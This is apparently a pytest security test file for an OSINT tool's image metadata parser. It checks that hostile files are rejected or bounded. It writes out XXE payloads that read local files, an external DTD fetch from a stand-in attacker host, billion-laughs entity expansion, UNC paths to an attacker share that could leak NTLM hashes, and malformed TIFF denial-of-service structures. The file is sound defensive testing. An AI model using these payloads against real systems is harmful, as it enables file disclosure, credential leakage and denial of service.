"""image_exif treats every file as hostile: bounded size, bounded parser work, no XML entity expansion.

The contract under test: whatever the bytes, ``fetch`` either returns a dict or raises ``SourceError``
(``SourceUnavailable`` for bad input). No raw parser exception, no hang, no file read beyond the target.
"""

import os
import re
import struct
import sys
import time
from pathlib import Path

import pytest

from secure_osint.sources.base import SourceError, SourceUnavailable
from secure_osint.utils.deadline import DeadlineExceeded, deadline_scope

pytest.importorskip('PIL.Image')
pytest.importorskip('exifread')
pytest.importorskip('defusedxml')

from secure_osint.sources import image_exif_source  # noqa: E402
from secure_osint.sources.image_exif_source import ImageExifSource  # noqa: E402
from tests.test_image_exif import (  # noqa: E402
    ASCII,
    LONG,
    has_warning,
    inject_xmp,
    make_jpeg,
    make_tiff,
    milan_gps,
    run,
    tiff_ifd,
    write,
    xmp_packet,
)


def run_bounded(path: Path, seconds: float = 10.0):
    """Run the source and fail if it takes longer than ``seconds`` (a DoS regression)."""
    started = time.monotonic()
    try:
        return run(path)
    finally:
        assert time.monotonic() - started < seconds, 'parser work is not bounded'


# --- Path / file-type checks -------------------------------------------------------------------------


def test_missing_file(tmp_path):
    with pytest.raises(SourceUnavailable, match='not found'):
        run(tmp_path / 'nope.jpg')


def test_directory_is_rejected(tmp_path):
    (tmp_path / 'album.jpg').mkdir()
    with pytest.raises(SourceUnavailable, match='regular file'):
        run(tmp_path / 'album.jpg')


def test_non_image_file_is_rejected(tmp_path):
    with pytest.raises(SourceUnavailable, match='not a recognised image'):
        run(write(tmp_path, 'notes.jpg', b'hello, this is a text file, not a picture\n'))


def test_html_disguised_as_image_is_rejected(tmp_path):
    with pytest.raises(SourceUnavailable, match='not a recognised image'):
        run(write(tmp_path, 'x.png', b'<html><script>alert(1)</script></html>'))


def test_empty_file_is_rejected(tmp_path):
    with pytest.raises(SourceUnavailable, match='empty'):
        run(write(tmp_path, 'empty.jpg', b''))


def test_oversized_file_is_rejected_before_parsing(tmp_path, monkeypatch):
    monkeypatch.setattr(image_exif_source, 'MAX_FILE_BYTES', 1024)
    calls = []
    monkeypatch.setattr(image_exif_source, '_parse_exif', lambda *a, **k: calls.append(a) or {})
    with pytest.raises(SourceUnavailable, match='too large'):
        run(write(tmp_path, 'big.jpg', b'\xff\xd8\xff\xe0' + b'\x00' * 4096))
    assert calls == []


def test_file_growing_after_stat_is_still_capped(tmp_path, monkeypatch):
    # TOCTOU: the size check on stat() passes, then the file is larger when read. The read is capped too.
    path = write(tmp_path, 'grow.jpg', b'\xff\xd8\xff\xe0' + b'\x00' * 4096)
    real_stat, real_fstat = os.stat, os.fstat

    class SmallStat:
        def __init__(self, st):
            self._st = st

        def __getattr__(self, name):
            return 10 if name == 'st_size' else getattr(self._st, name)

    monkeypatch.setattr(image_exif_source.os, 'stat', lambda p, *a, **k: SmallStat(real_stat(p, *a, **k)))
    monkeypatch.setattr(image_exif_source.os, 'fstat', lambda fd: SmallStat(real_fstat(fd)))
    monkeypatch.setattr(image_exif_source, 'MAX_FILE_BYTES', 1024)
    with pytest.raises(SourceUnavailable, match='too large'):
        run(path)


@pytest.mark.skipif(not hasattr(os, 'mkfifo'), reason='FIFOs are POSIX-only')
def test_fifo_is_rejected_without_blocking(tmp_path):
    fifo = tmp_path / 'pipe.jpg'
    os.mkfifo(fifo)
    started = time.monotonic()
    with pytest.raises(SourceUnavailable, match='regular file'):
        run(fifo)
    assert time.monotonic() - started < 5


@pytest.mark.skipif(not os.path.exists('/dev/zero'), reason='needs /dev/zero')
def test_device_file_is_rejected():
    with pytest.raises(SourceUnavailable, match='regular file'):
        run('/dev/zero')


UNC_FORMS = [
    r'\\attacker.example\share\x.jpg',
    '//attacker.example/share/x.jpg',
    r'\/attacker.example/share/x.jpg',  # Windows accepts any mix of separators
    r'/\attacker.example\share\x.jpg',
    r'\??\UNC\attacker.example\share\x.jpg',  # NT object-manager prefix
    r'  \\attacker.example\share\x.jfif',
]


@pytest.mark.parametrize('value', UNC_FORMS)
def test_unc_paths_never_touch_the_filesystem(value, monkeypatch):
    # On Windows, opening \\host\share makes the OS authenticate to that host with the user's NTLM hash.
    def boom(*args, **kwargs):
        raise AssertionError('filesystem must not be touched for UNC paths')

    monkeypatch.setattr(image_exif_source.os, 'stat', boom)
    monkeypatch.setattr(image_exif_source.os, 'open', boom)
    monkeypatch.setattr(Path, 'resolve', boom)
    with pytest.raises(SourceUnavailable, match='network path'):
        run(value)


def test_error_messages_do_not_leak_the_full_path(tmp_path):
    with pytest.raises(SourceUnavailable) as exc:
        run(tmp_path / 'secret-case-folder' / 'nope.jpg')
    assert str(tmp_path) not in str(exc.value)


# --- Malformed EXIF ----------------------------------------------------------------------------------


@pytest.mark.parametrize('cut', [4, 12, 30, 60, 120, 200])
def test_truncated_jpeg_never_raises_raw_exceptions(tmp_path, cut):
    jpeg = make_jpeg(gps=milan_gps(), body_serial='SN1')
    path = write(tmp_path, 't.jpg', jpeg[:cut])
    try:
        data = run_bounded(path)
    except SourceUnavailable:
        return
    assert isinstance(data['warnings'], list)


def test_truncated_tiff(tmp_path):
    tiff = make_tiff([(0x010F, ASCII, 40, 200)])  # Make string points far beyond EOF
    try:
        data = run_bounded(write(tmp_path, 't.tif', tiff[:-3]))
    except SourceUnavailable:
        return
    assert data['camera']['make'] in (None, '')


def test_absurd_ifd_entry_count(tmp_path):
    # IFD0 claims 65535 entries in a 14-byte file: every read past EOF must be cheap and safe.
    tiff = b'II*\x00' + struct.pack('<I', 8) + struct.pack('<H', 0xFFFF)
    try:
        run_bounded(write(tmp_path, 'absurd.tif', tiff))
    except SourceUnavailable:
        pass


def test_absurd_value_count_does_not_allocate(tmp_path):
    # An ASCII tag declaring a 4 GiB value: the read is bounded by the (capped) file size.
    tiff = make_tiff([(0x010F, ASCII, 0xFFFFFFFF, 26)], b'Canon\x00')
    try:
        run_bounded(write(tmp_path, 'count.tif', tiff))
    except SourceUnavailable:
        pass


def test_gps_ifd_fan_out_is_bounded(tmp_path):
    # Algorithmic DoS: IFD0 repeats the GPSInfo pointer N times and exifread re-walks the M-entry GPS IFD
    # for each one (N*M tag decodes; ~9 million here). The read budget must stop it quickly.
    n = m = 3000
    gps_offset = 8 + 2 + 12 * n + 4
    ifd0 = [(0x8825, LONG, 1, gps_offset)] * n
    gps_ifd = tiff_ifd([(0x0001, ASCII, 2, 0x4E)] * m)
    with pytest.raises(SourceUnavailable, match='too complex'):
        run_bounded(write(tmp_path, 'fanout.tif', make_tiff(ifd0, gps_ifd)), seconds=15)


def test_ifd_chain_loop_terminates(tmp_path):
    # IFD0's next-IFD pointer points back at IFD0.
    tiff = b'II*\x00' + struct.pack('<I', 8) + tiff_ifd([(0x010F, ASCII, 4, 0x006E6F4E)], next_ifd=8)
    try:
        run_bounded(write(tmp_path, 'loop.tif', tiff))
    except SourceUnavailable:
        pass


def test_parser_crash_is_wrapped(tmp_path, monkeypatch):
    import exifread

    def explode(*args, **kwargs):
        raise struct.error('unpack requires a buffer of 4 bytes')

    monkeypatch.setattr(exifread, 'process_file', explode)
    with pytest.raises(SourceUnavailable, match='EXIF'):
        run(write(tmp_path, 'p.jpg', make_jpeg()))


def test_recursion_error_is_wrapped(tmp_path, monkeypatch):
    import exifread

    def explode(*args, **kwargs):
        raise RecursionError('maximum recursion depth exceeded')

    monkeypatch.setattr(exifread, 'process_file', explode)
    with pytest.raises(SourceUnavailable):
        run(write(tmp_path, 'p.jpg', make_jpeg()))


def test_step_deadline_stops_the_parser(tmp_path):
    # A spent deadline must stop parsing (the engine cannot kill a CPU-bound worker thread).
    path = write(tmp_path, 'p.jpg', make_jpeg(gps=milan_gps()))
    with deadline_scope(0):
        with pytest.raises(DeadlineExceeded):
            run(path)


def test_only_source_errors_escape(tmp_path):
    # Random corruption sweep over a valid file: only SourceError subclasses may propagate.
    import random

    rng = random.Random(1234)
    base = bytearray(make_jpeg(gps=milan_gps(), body_serial='SN1', owner='X'))
    for i in range(60):
        mutated = bytearray(base)
        for _ in range(8):
            pos = rng.randrange(2, min(len(mutated), 400))
            mutated[pos] = rng.randrange(256)
        path = write(tmp_path, f'm{i}.jpg', bytes(mutated))
        try:
            run_bounded(path)
        except SourceError:
            pass


# --- Hostile XMP -------------------------------------------------------------------------------------


def test_xmp_external_entity_is_not_resolved(tmp_path):
    secret = write(tmp_path, 'secret.txt', b'TOP-SECRET-CANARY-31337')
    doctype = f'<!DOCTYPE x:xmpmeta [<!ENTITY xxe SYSTEM "{secret.resolve().as_uri()}">]>'
    body = (
        '<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">'
        '<dc:description>&xxe;</dc:description></rdf:Description>'
    )
    data = run(write(tmp_path, 'xxe.jpg', inject_xmp(make_jpeg(), xmp_packet(body, doctype))))
    assert 'TOP-SECRET-CANARY-31337' not in repr(data)
    assert data['xmp'] == {}
    assert has_warning(data, 'XMP', 'rejected')
    assert data['camera']['make'] == 'Canon'  # the rest of the evidence is still reported


def test_xmp_parameter_entity_is_not_fetched(tmp_path, monkeypatch):
    import socket

    def no_network(*args, **kwargs):
        raise AssertionError('XMP parsing must never open a connection')

    monkeypatch.setattr(socket, 'socket', no_network)
    monkeypatch.setattr(socket, 'getaddrinfo', no_network)
    doctype = '<!DOCTYPE x [<!ENTITY % remote SYSTEM "http://attacker.invalid/evil.dtd"> %remote;]>'
    body = '<rdf:Description rdf:about=""/>'
    data = run(write(tmp_path, 'oob.jpg', inject_xmp(make_jpeg(), xmp_packet(body, doctype))))
    assert data['xmp'] == {}
    assert has_warning(data, 'XMP', 'rejected')


def test_xmp_billion_laughs_is_rejected_quickly(tmp_path):
    entities = '<!ENTITY lol0 "lol">' + ''.join(
        f'<!ENTITY lol{i} "{("&lol" + str(i - 1) + ";") * 10}">' for i in range(1, 10)
    )
    doctype = f'<!DOCTYPE x [{entities}]>'
    body = (
        '<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">'
        '<dc:description>&lol9;</dc:description></rdf:Description>'
    )
    data = run_bounded(write(tmp_path, 'lol.jpg', inject_xmp(make_jpeg(), xmp_packet(body, doctype))), seconds=5)
    assert data['xmp'] == {}
    assert has_warning(data, 'XMP', 'rejected')


def test_malformed_xmp_is_a_warning_not_a_failure(tmp_path):
    packet = b'<?xpacket begin=""?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF><unclosed></x:xmpmeta>'
    data = run(write(tmp_path, 'bad.jpg', inject_xmp(make_jpeg(), packet)))
    assert data['xmp'] == {}
    assert has_warning(data, 'XMP')


def test_oversized_xmp_packet_is_not_parsed(tmp_path, monkeypatch):
    monkeypatch.setattr(image_exif_source, 'MAX_XMP_BYTES', 512)
    body = (
        '<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">'
        f'<dc:description>{"x" * 2000}</dc:description></rdf:Description>'
    )
    data = run(write(tmp_path, 'bigxmp.jpg', inject_xmp(make_jpeg(), xmp_packet(body))))
    assert data['xmp'] == {}
    assert has_warning(data, 'XMP', 'too large')


def test_unterminated_xmp_packet(tmp_path):
    packet = b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF>' + b'A' * 100
    data = run(write(tmp_path, 'open.jpg', inject_xmp(make_jpeg(), packet)))
    assert data['xmp'] == {}


def test_deeply_nested_xmp_is_bounded(tmp_path):
    depth = 5000
    body = (
        '<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:description>'
        + '<a>' * depth
        + 'x'
        + '</a>' * depth
        + '</dc:description></rdf:Description>'
    )
    data = run_bounded(write(tmp_path, 'deep.jpg', inject_xmp(make_jpeg(), xmp_packet(body))))
    assert isinstance(data['xmp'], dict)


def test_exifread_xmp_mode_is_never_enabled(tmp_path, monkeypatch):
    # exifread's own XMP support (debug=True) parses with xml.dom.minidom, which is not hardened.
    import exifread

    seen = {}
    real = exifread.process_file

    def spy(fh, **kwargs):
        seen.update(kwargs)
        return real(fh, **kwargs)

    monkeypatch.setattr(exifread, 'process_file', spy)
    run(write(tmp_path, 'p.jpg', make_jpeg()))
    assert seen['debug'] is False
    assert seen['details'] is False
    assert seen['extract_thumbnail'] is False


def test_source_has_no_stdlib_xml_imports():
    source = Path(image_exif_source.__file__).read_text(encoding='utf-8')
    assert not re.search(r'^\s*(?:from|import)\s+(?:xml|lxml)\b', source, re.MULTILINE)
    assert sys.modules.get('secure_osint.sources.image_exif_source') is image_exif_source
    assert ImageExifSource.cacheable is False
